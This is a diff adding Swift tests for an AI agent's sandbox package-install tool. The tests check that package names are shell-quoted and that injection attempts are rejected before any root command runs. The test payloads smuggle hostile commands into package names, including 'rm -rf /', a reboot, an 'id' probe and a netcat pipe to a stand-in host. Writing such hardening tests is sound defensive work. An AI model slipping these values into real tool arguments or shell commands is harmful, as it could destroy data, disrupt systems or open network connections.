@@ -387,7 +387,84 @@ struct BuiltinSandboxToolsTests {
         // Refresh the index first so a stale apk db can't poison `add`.
         #expect(command.contains("apk update --quiet"))
         #expect(command.contains("apk add --no-cache"))
-        #expect(command.contains("ffmpeg"))
+        // Validated tokens are single-quoted at the sh -c boundary.
+        #expect(command.contains("'ffmpeg'"))
+    }
+
+    /// Shell-injection package names must fail with `invalid_args` and
+    /// record zero root-runner calls — the pre-hardening path interpolated
+    /// agent strings straight into `apk add` under `sh -c`.
+    @Test @MainActor
+    func sandboxApkInstall_rejectsShellInjectionWithoutRootCalls() async throws {
+        let payloads = [
+            #"{"manager":"apk","packages":["curl; id"]}"#,
+            #"{"manager":"apk","packages":["curl$(reboot)"]}"#,
+            #"{"manager":"apk","packages":["--allow-untrusted"]}"#,
+            #"{"manager":"apk","packages":["curl|nc evil 1"]}"#,
+            #"{"manager":"apk","packages":["curl","ffmpeg; rm -rf /"]}"#,
+        ]
+
+        for argumentsJSON in payloads {
+            let runner = MockSandboxToolCommandRunner(
+                rootResults: [.init(stdout: "should-not-run", stderr: "", exitCode: 0)],
+                agentResults: []
+            )
+            let output = try await withRegisteredSandboxTools(runner: runner) {
+                try await ToolRegistry.shared.execute(
+                    name: "sandbox_install",
+                    argumentsJSON: argumentsJSON
+                )
+            }
+
+            // Seatbelt rejects the manager before package validation; both
+            // paths must still leave the root runner untouched.
+            #expect(ToolEnvelope.isError(output), "args=\(argumentsJSON)")
+            let payload = try failurePayload(output)
+            #expect(payload["kind"] as? String == "invalid_args", "args=\(argumentsJSON)")
+            let calls = await runner.calls
+            #expect(calls.isEmpty, "root must not run for \(argumentsJSON); calls=\(calls)")
+        }
+    }
+
+    /// Valid constraints and duplicates still produce one install path
+    /// with deduplicated, shell-quoted package atoms.
+    @Test @MainActor
+    func sandboxApkInstall_dedupesValidPackagesIntoOneRootCommand() async throws {
+        let runner = MockSandboxToolCommandRunner(
+            rootResults: [.init(stdout: "", stderr: "", exitCode: 0)],
+            agentResults: []
+        )
+
+        let output = try await withRegisteredSandboxTools(runner: runner) {
+            try await ToolRegistry.shared.execute(
+                name: "sandbox_install",
+                argumentsJSON:
+                    #"{"manager":"apk","packages":["curl","ffmpeg","curl","python3>=3.11","ffmpeg@edge"]}"#
+            )
+        }
+
+        guard SandboxBackend.current == .virtualMachine else {
+            #expect(ToolEnvelope.isError(output))
+            let calls = await runner.calls
+            #expect(calls.isEmpty)
+            return
+        }
+
+        let payload = try successPayload(output)
+        #expect(payload["exit_code"] as? Int == 0)
+        let installed = try #require(payload["installed"] as? [String])
+        #expect(installed == ["curl", "ffmpeg", "python3>=3.11", "ffmpeg@edge"])
+
+        let calls = await runner.calls
+        #expect(calls.count == 1)
+        guard case .root(let command) = calls[0] else {
+            Issue.record("expected single root apk install")
+            return
+        }
+        #expect(command.contains("apk add --no-cache 'curl' 'ffmpeg' 'python3>=3.11' 'ffmpeg@edge'"))
+        // Deduped: curl appears only once in the package list.
+        let addPart = command.components(separatedBy: "apk add --no-cache ").last ?? ""
+        #expect(addPart.components(separatedBy: "'curl'").count == 2)
     }
 
     @Test @MainActor
